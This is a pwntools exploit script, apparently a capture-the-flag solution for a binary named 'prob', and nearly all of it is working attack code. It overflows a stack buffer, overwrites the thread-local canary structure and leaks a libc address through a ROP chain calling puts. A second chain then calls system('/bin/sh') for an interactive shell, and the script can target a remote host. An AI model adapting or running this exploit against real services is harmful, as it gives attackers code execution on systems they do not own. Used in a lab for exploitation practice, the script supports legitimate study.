#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('prob')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def inc_count():
    for _ in range(4):
        io.sendlineafter(b":", b"999")
    
    io.sendafter(b"nickname:", b"A")
    io.sendlineafter(b":", b"yes")


def solve():

    for _ in range(8):
        inc_count()
    
    for _ in range(4):
        io.sendlineafter(b":", b"999")
    
    offset = 264
    pop_rdi = 0x4013b3

    tls_write = flat({
        offset: [
            b"A"*0x10,
            pop_rdi,
            exe.got["puts"],
            exe.plt["puts"],
            exe.sym["main"]
        ]
    })

    tcbhead_t = flat(
        [
            0,
            0,
            exe.bss()+0x100,
            0,
            0,
            b"A"*8
        ]
    )

    padding_offset = 0x900
    padding = b"\x00"*(padding_offset - len(tls_write))

    payload = tls_write + padding + tcbhead_t

    io.sendafter(b"name:", payload)
    io.recvuntil(b"\n")
    puts = u64(io.recv(6).ljust(8, b"\x00"))
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    for _ in range(4):
        io.sendlineafter(b":", b"999")
    
    payload = flat({
        offset: [
            b"A"*0x10,
            pop_rdi,
            next(libc.search(b"/bin/sh\x00")),
            pop_rdi + 1,
            libc.sym["system"]
        ]
    })

    io.sendafter(b":", payload)
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
